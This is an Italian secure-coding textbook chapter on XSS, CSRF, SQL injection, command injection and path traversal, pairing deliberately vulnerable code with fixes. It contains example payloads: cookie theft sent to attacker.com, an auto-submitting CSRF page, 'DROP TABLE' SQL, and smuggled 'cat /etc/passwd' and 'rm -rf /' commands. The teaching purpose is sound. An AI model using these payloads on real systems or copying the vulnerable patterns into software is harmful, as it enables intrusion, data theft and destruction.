# 15. Vulnerabilità HTTP Comuni

## 15.1 Cross-Site Scripting (XSS)

### 15.1.1 - Introduzione

**XSS** (Cross-Site Scripting) è una vulnerabilità che permette a un attaccante di **iniettare codice JavaScript** in pagine web visualizzate da altri utenti.

**Impatto:**
- 🔴 Furto di cookie e session token
- 🔴 Defacement del sito
- 🔴 Phishing
- 🔴 Keylogging
- 🔴 Redirect a siti malevoli

### 15.1.2 - Reflected XSS

**Scenario:** Input utente riflesso immediatamente nella risposta.

**Codice vulnerabile:**
```php
<!-- search.php -->
<h1>Risultati per: <?php echo $_GET['q']; ?></h1>
```

**Attacco:**
```
URL: http://example.com/search.php?q=<script>alert('XSS')</script>

Output HTML:
<h1>Risultati per: <script>alert('XSS')</script></h1>

→ JavaScript eseguito nel browser della vittima!
```

**Attacco avanzato (furto cookie):**
```html
<!-- URL malevolo -->
http://example.com/search.php?q=<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

<!-- L'attaccante ottiene il cookie di sessione della vittima -->
```

**Mitigation - HTML Escaping:**
```php
<?php
function escapeHtml($str) {
    return htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
}
?>

<h1>Risultati per: <?php echo escapeHtml($_GET['q']); ?></h1>

<!-- Output sicuro -->
<h1>Risultati per: &lt;script&gt;alert('XSS')&lt;/script&gt;</h1>
<!-- Script NON eseguito -->
```

**JavaScript escape function:**
```javascript
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

// Express.js esempio
app.get('/search', (req, res) => {
    const query = escapeHtml(req.query.q);
    res.send(`<h1>Risultati per: ${query}</h1>`);
});
```

### 15.1.3 - Stored XSS (Persistent XSS)

**Scenario:** Input malevolo salvato nel database e mostrato ad altri utenti.

**Esempio - Sistema commenti vulnerabile:**
```javascript
// POST /comments
app.post('/comments', async (req, res) => {
    const comment = req.body.text;
    
    // ❌ VULNERABILE - Nessuna sanitizzazione!
    await db.query('INSERT INTO comments (text) VALUES (?)', [comment]);
    
    res.redirect('/comments');
});

// GET /comments
app.get('/comments', async (req, res) => {
    const comments = await db.query('SELECT * FROM comments');
    
    let html = '<h1>Commenti</h1>';
    comments.forEach(c => {
        // ❌ VULNERABILE - Inserimento diretto HTML!
        html += `<div class="comment">${c.text}</div>`;
    });
    
    res.send(html);
});
```

**Attacco:**
```javascript
// Attaccante invia commento:
POST /comments
Content-Type: application/json

{
    "text": "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>"
}

// Ogni utente che visita /comments esegue lo script!
// Cookie rubati da tutti gli utenti
```

**Mitigation - Sanitize Input:**
```javascript
const sanitizeHtml = require('sanitize-html');

app.post('/comments', async (req, res) => {
    const rawComment = req.body.text;
    
    // ✅ Sanitizza HTML permettendo solo tag sicuri
    const cleanComment = sanitizeHtml(rawComment, {
        allowedTags: ['b', 'i', 'em', 'strong', 'p', 'br'],
        allowedAttributes: {},
        allowedSchemes: []
    });
    
    await db.query('INSERT INTO comments (text) VALUES (?)', [cleanComment]);
    
    res.redirect('/comments');
});

// Alternativa: escape completo (no HTML)
app.post('/comments', async (req, res) => {
    const escapedComment = escapeHtml(req.body.text);
    await db.query('INSERT INTO comments (text) VALUES (?)', [escapedComment]);
    res.redirect('/comments');
});
```

### 15.1.4 - DOM-based XSS

**Scenario:** Vulnerabilità nel JavaScript client-side.

**Codice vulnerabile:**
```html
<!-- index.html -->
<!DOCTYPE html>
<html>
<body>
    <div id="greeting"></div>
    
    <script>
        // ❌ VULNERABILE
        const name = window.location.hash.substring(1);
        document.getElementById('greeting').innerHTML = 'Ciao ' + name;
    </script>
</body>
</html>
```

**Attacco:**
```
URL: http://example.com/index.html#<img src=x onerror=alert('XSS')>

DOM risultante:
<div id="greeting">Ciao <img src=x onerror=alert('XSS')></div>

→ onerror eseguito!
```

**Mitigation:**
```html
<script>
    // ✅ SOLUZIONE 1: Usa textContent invece di innerHTML
    const name = window.location.hash.substring(1);
    document.getElementById('greeting').textContent = 'Ciao ' + name;
    // textContent escapa automaticamente HTML
    
    // ✅ SOLUZIONE 2: Usa DOMPurify library
    const name = window.location.hash.substring(1);
    const clean = DOMPurify.sanitize(name);
    document.getElementById('greeting').innerHTML = 'Ciao ' + clean;
    
    // ✅ SOLUZIONE 3: Validate input
    const name = window.location.hash.substring(1);
    if (/^[a-zA-Z0-9\s]+$/.test(name)) {
        document.getElementById('greeting').textContent = 'Ciao ' + name;
    } else {
        document.getElementById('greeting').textContent = 'Nome non valido';
    }
</script>
```

### 15.1.5 - Content Security Policy (CSP)

**Defense in Depth - CSP Header:**

```nginx
# Nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'";
```

```javascript
// Express.js
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
    directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:"],
        connectSrc: ["'self'"],
        fontSrc: ["'self'"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
        frameSrc: ["'none'"]
    }
}));
```

**HTTP Response:**
```http
HTTP/2 200 OK
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'

<!-- Solo script dallo stesso origin permessi -->
<!-- Inline script bloccati -->
<!-- XSS mitigato anche se presente -->
```

---

## 15.2 Cross-Site Request Forgery (CSRF)

### 15.2.1 - Introduzione

**CSRF** permette a un attaccante di **eseguire azioni** su un sito web **a nome dell'utente vittima**, senza che la vittima lo sappia.

**Requisiti attacco:**
1. Vittima autenticata su sito target
2. Sito vulnerabile (no CSRF protection)
3. Attaccante conosce struttura richieste

### 15.2.2 - Attacco CSRF

**Scenario: Trasferimento bancario**

```html
<!-- Sito legittimo: bank.com -->
<form action="/transfer" method="POST">
    <input name="to" placeholder="Destinatario">
    <input name="amount" placeholder="Importo">
    <button>Trasferisci</button>
</form>
```

**Sito attaccante (evil.com):**
```html
<!DOCTYPE html>
<html>
<body>
    <h1>Hai vinto un premio! Clicca qui!</h1>
    
    <!-- Form invisibile auto-submit -->
    <iframe style="display:none" name="csrf-frame"></iframe>
    
    <form id="csrf-form" 
          action="https://bank.com/transfer" 
          method="POST" 
          target="csrf-frame">
        <input type="hidden" name="to" value="attacker_account">
        <input type="hidden" name="amount" value="10000">
    </form>
    
    <script>
        // Auto-submit quando utente visita pagina
        document.getElementById('csrf-form').submit();
    </script>
    
    <!-- Alternativa: immagine auto-GET -->
    <img src="https://bank.com/transfer?to=attacker_account&amount=10000" 
         style="display:none">
</body>
</html>
```

**Flusso attacco:**
```
1. Vittima autenticata su bank.com (cookie sessione attivo)
2. Vittima visita evil.com (link phishing/email/ads)
3. evil.com invia richiesta POST a bank.com
4. Browser include automaticamente cookie bank.com
5. bank.com esegue trasferimento (pensa sia richiesta legittima)
6. Soldi trasferiti all'attaccante!
```

### 15.2.3 - CSRF Token Protection

**Implementazione lato server:**

```javascript
const express = require('express');
const session = require('express-session');
const crypto = require('crypto');

const app = express();

app.use(session({
    secret: 'secret-key',
    resave: false,
    saveUninitialized: true
}));

app.use(express.urlencoded({ extended: true }));

// Middleware per generare CSRF token
app.use((req, res, next) => {
    if (!req.session.csrfToken) {
        req.session.csrfToken = crypto.randomBytes(32).toString('hex');
    }
    res.locals.csrfToken = req.session.csrfToken;
    next();
});

// GET form
app.get('/transfer', (req, res) => {
    res.send(`
        <form method="POST" action="/transfer">
            <input type="hidden" name="_csrf" value="${res.locals.csrfToken}">
            <input name="to" placeholder="Destinatario">
            <input name="amount" placeholder="Importo">
            <button>Trasferisci</button>
        </form>
    `);
});

// POST transfer con CSRF validation
app.post('/transfer', (req, res) => {
    const { _csrf, to, amount } = req.body;
    
    // ✅ Verifica CSRF token
    if (_csrf !== req.session.csrfToken) {
        return res.status(403).send('Invalid CSRF token');
    }
    
    // Token valido, procedi
    console.log(`Transfer ${amount} to ${to}`);
    res.send('Transfer completed');
});

app.listen(3000);
```

**Usando libreria csurf:**
```javascript
const csrf = require('csurf');

const csrfProtection = csrf({ cookie: true });

app.get('/transfer', csrfProtection, (req, res) => {
    res.send(`
        <form method="POST" action="/transfer">
            <input type="hidden" name="_csrf" value="${req.csrfToken()}">
            <input name="to">
            <input name="amount">
            <button>Trasferisci</button>
        </form>
    `);
});

app.post('/transfer', csrfProtection, (req, res) => {
    // CSRF automaticamente verificato
    res.send('Transfer OK');
});
```

### 15.2.4 - SameSite Cookie

**Moderna difesa CSRF:**

```javascript
app.use(session({
    secret: 'secret-key',
    cookie: {
        sameSite: 'strict', // o 'lax' o 'none'
        secure: true,       // solo HTTPS
        httpOnly: true      // no JavaScript access
    }
}));
```

**Valori SameSite:**

```javascript
// strict: cookie MAI inviato in cross-site requests
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly

// lax: cookie inviato solo in GET top-level navigation
Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly

// none: cookie sempre inviato (richiede Secure)
Set-Cookie: session=abc123; SameSite=None; Secure; HttpOnly
```

**Esempio comportamento:**

```html
<!-- SameSite=Strict -->
<a href="https://bank.com/profile">Link</a>
<!-- ✅ Cookie inviato (GET navigation) -->

<form action="https://bank.com/transfer" method="POST">
<!-- ❌ Cookie NON inviato (cross-site POST) → CSRF bloccato! -->
</form>

<!-- SameSite=Lax -->
<a href="https://bank.com/profile">Link</a>
<!-- ✅ Cookie inviato (GET navigation) -->

<form action="https://bank.com/transfer" method="POST">
<!-- ❌ Cookie NON inviato (cross-site POST) → CSRF bloccato! -->
</form>

<!-- SameSite=None -->
<!-- Cookie sempre inviato (usare solo se necessario) -->
```

### 15.2.5 - Double Submit Cookie Pattern

**Alternativa al CSRF token in session:**

```javascript
app.post('/transfer', (req, res) => {
    const csrfCookie = req.cookies.csrfToken;
    const csrfHeader = req.headers['x-csrf-token'];
    
    if (csrfCookie !== csrfHeader) {
        return res.status(403).send('Invalid CSRF token');
    }
    
    // Procedi
    res.send('OK');
});

// Client JavaScript
fetch('/transfer', {
    method: 'POST',
    headers: {
        'X-CSRF-Token': getCookie('csrfToken'),
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ to: 'account', amount: 100 })
});
```

---

## 15.3 SQL Injection

### 15.3.1 - Introduzione

**SQL Injection** permette a un attaccante di **iniettare codice SQL** in query database, ottenendo accesso non autorizzato ai dati.

**Impatto:**
- 🔴 Lettura dati sensibili (password, carte credito)
- 🔴 Modifica/eliminazione dati
- 🔴 Bypass autenticazione
- 🔴 Esecuzione comandi OS (in alcuni casi)

### 15.3.2 - Attacco SQL Injection

**Codice vulnerabile:**

```javascript
// ❌ VULNERABILE - String concatenation
app.get('/user', (req, res) => {
    const userId = req.query.id;
    
    const query = `SELECT * FROM users WHERE id = ${userId}`;
    
    db.query(query, (err, results) => {
        if (err) return res.status(500).send('Error');
        res.json(results);
    });
});
```

**Attacco 1 - Dump tutti gli utenti:**
```
GET /user?id=1 OR 1=1

Query SQL risultante:
SELECT * FROM users WHERE id = 1 OR 1=1

Risultato: Tutti gli utenti del database!
```

**Attacco 2 - SQL Injection con commento:**
```
GET /user?id=1; DROP TABLE users; --

Query SQL risultante:
SELECT * FROM users WHERE id = 1; DROP TABLE users; --

Risultato: Tabella users eliminata!
```

**Attacco 3 - Bypass login:**
```javascript
// Login vulnerabile
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
    
    db.query(query, (err, results) => {
        if (results.length > 0) {
            res.send('Login successful');
        } else {
            res.send('Invalid credentials');
        }
    });
});
```

**Attacco:**
```
POST /login
username: admin' --
password: anything

Query risultante:
SELECT * FROM users WHERE username = 'admin' -- AND password = 'anything'

→ Password check commentato!
→ Login come admin senza password!
```

### 15.3.3 - Prepared Statements (Parameterized Queries)

**✅ SOLUZIONE SICURA:**

```javascript
// MySQL (mysql2 library)
app.get('/user', (req, res) => {
    const userId = req.query.id;
    
    // ✅ Prepared statement con placeholder ?
    const query = 'SELECT * FROM users WHERE id = ?';
    
    db.query(query, [userId], (err, results) => {
        if (err) return res.status(500).send('Error');
        res.json(results);
    });
});

// Login sicuro
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
    
    db.query(query, [username, password], (err, results) => {
        if (err) return res.status(500).send('Error');
        
        if (results.length > 0) {
            res.send('Login successful');
        } else {
            res.send('Invalid credentials');
        }
    });
});
```

**PostgreSQL (pg library):**
```javascript
const { Pool } = require('pg');
const pool = new Pool();

app.get('/user', async (req, res) => {
    const userId = req.query.id;
    
    // ✅ Parametrized query con $1, $2, etc.
    const query = 'SELECT * FROM users WHERE id = $1';
    
    try {
        const result = await pool.query(query, [userId]);
        res.json(result.rows);
    } catch (err) {
        res.status(500).send('Error');
    }
});
```

**ORM (Sequelize):**
```javascript
const { User } = require('./models');

app.get('/user', async (req, res) => {
    const userId = req.query.id;
    
    // ✅ ORM automatically escapes
    const user = await User.findByPk(userId);
    
    res.json(user);
});

// Query con where
app.get('/users/search', async (req, res) => {
    const name = req.query.name;
    
    // ✅ Sequelize protegge da SQL injection
    const users = await User.findAll({
        where: {
            name: name
        }
    });
    
    res.json(users);
});
```

### 15.3.4 - Input Validation

**Validazione aggiuntiva:**

```javascript
const validator = require('validator');

app.get('/user', (req, res) => {
    const userId = req.query.id;
    
    // ✅ Validate input type
    if (!validator.isInt(userId)) {
        return res.status(400).send('Invalid user ID');
    }
    
    const query = 'SELECT * FROM users WHERE id = ?';
    db.query(query, [userId], (err, results) => {
        res.json(results);
    });
});

// Email validation
app.post('/subscribe', (req, res) => {
    const email = req.body.email;
    
    if (!validator.isEmail(email)) {
        return res.status(400).send('Invalid email');
    }
    
    const query = 'INSERT INTO subscribers (email) VALUES (?)';
    db.query(query, [email], (err) => {
        res.send('Subscribed');
    });
});
```

---

## 15.4 Command Injection

### 15.4.1 - Vulnerabilità

**Command Injection** permette esecuzione di comandi **arbitrari** sul server.

**Codice vulnerabile:**

```javascript
const { exec } = require('child_process');

// ❌ PERICOLOSO!
app.get('/ping', (req, res) => {
    const host = req.query.host;
    
    exec(`ping -c 4 ${host}`, (err, stdout, stderr) => {
        if (err) return res.status(500).send('Error');
        res.send(`<pre>${stdout}</pre>`);
    });
});
```

**Attacco:**
```
GET /ping?host=google.com; cat /etc/passwd

Comando eseguito:
ping -c 4 google.com; cat /etc/passwd

→ Password file leaked!

GET /ping?host=google.com; rm -rf /

Comando eseguito:
ping -c 4 google.com; rm -rf /

→ Sistema distrutto!
```

### 15.4.2 - Mitigation

**✅ SOLUZIONE 1: Input validation**

```javascript
app.get('/ping', (req, res) => {
    const host = req.query.host;
    
    // Validate: solo caratteri alfanumerici, punti, trattini
    if (!/^[a-z0-9.-]+$/i.test(host)) {
        return res.status(400).send('Invalid hostname');
    }
    
    exec(`ping -c 4 ${host}`, (err, stdout) => {
        res.send(`<pre>${stdout}</pre>`);
    });
});
```

**✅ SOLUZIONE 2: spawn (no shell)**

```javascript
const { spawn } = require('child_process');

app.get('/ping', (req, res) => {
    const host = req.query.host;
    
    // Validate
    if (!/^[a-z0-9.-]+$/i.test(host)) {
        return res.status(400).send('Invalid hostname');
    }
    
    // ✅ spawn senza shell (no command injection)
    const ping = spawn('ping', ['-c', '4', host]);
    
    let output = '';
    
    ping.stdout.on('data', (data) => {
        output += data.toString();
    });
    
    ping.on('close', (code) => {
        res.send(`<pre>${output}</pre>`);
    });
    
    ping.on('error', (err) => {
        res.status(500).send('Error');
    });
});
```

**✅ SOLUZIONE 3: Whitelist**

```javascript
const ALLOWED_HOSTS = ['google.com', 'github.com', 'example.com'];

app.get('/ping', (req, res) => {
    const host = req.query.host;
    
    if (!ALLOWED_HOSTS.includes(host)) {
        return res.status(400).send('Host not allowed');
    }
    
    const ping = spawn('ping', ['-c', '4', host]);
    // ...
});
```

---

## 15.5 Directory Traversal (Path Traversal)

### 15.5.1 - Vulnerabilità

**Directory Traversal** permette accesso a **file fuori dalla directory prevista**.

**Codice vulnerabile:**

```javascript
// ❌ VULNERABILE
app.get('/files/:filename', (req, res) => {
    const filename = req.params.filename;
    const filepath = `/var/www/uploads/${filename}`;
    
    res.sendFile(filepath);
});
```

**Attacco:**
```
GET /files/../../etc/passwd

Filepath risultante:
/var/www/uploads/../../etc/passwd
= /etc/passwd

→ File di sistema leaked!

GET /files/../../app/config.js

→ Configurazione app (credenziali DB) leaked!
```

### 15.5.2 - Mitigation

**✅ SOLUZIONE 1: path.basename**

```javascript
const path = require('path');

app.get('/files/:filename', (req, res) => {
    const uploadsDir = '/var/www/uploads';
    
    // ✅ Remove ../ sequences
    const filename = path.basename(req.params.filename);
    
    const filepath = path.join(uploadsDir, filename);
    
    res.sendFile(filepath);
});
```

**✅ SOLUZIONE 2: Verify path**

```javascript
const path = require('path');
const fs = require('fs');

app.get('/files/:filename', (req, res) => {
    const uploadsDir = path.resolve('/var/www/uploads');
    const filename = path.basename(req.params.filename);
    const filepath = path.resolve(uploadsDir, filename);
    
    // ✅ Ensure file is within uploads directory
    if (!filepath.startsWith(uploadsDir)) {
        return res.status(403).send('Forbidden');
    }
    
    // ✅ Check file exists
    if (!fs.existsSync(filepath)) {
        return res.status(404).send('File not found');
    }
    
    res.sendFile(filepath);
});
```

**✅ SOLUZIONE 3: Whitelist files**

```javascript
const ALLOWED_FILES = {
    'report.pdf': '/var/www/uploads/report.pdf',
    'image.png': '/var/www/uploads/image.png'
};

app.get('/files/:filename', (req, res) => {
    const filepath = ALLOWED_FILES[req.params.filename];
    
    if (!filepath) {
        return res.status(404).send('File not found');
    }
    
    res.sendFile(filepath);
});
```

---

**Capitolo 15 completato!**

Prossimo: **Capitolo 16 - Man-in-the-Middle (MITM) Attacks**
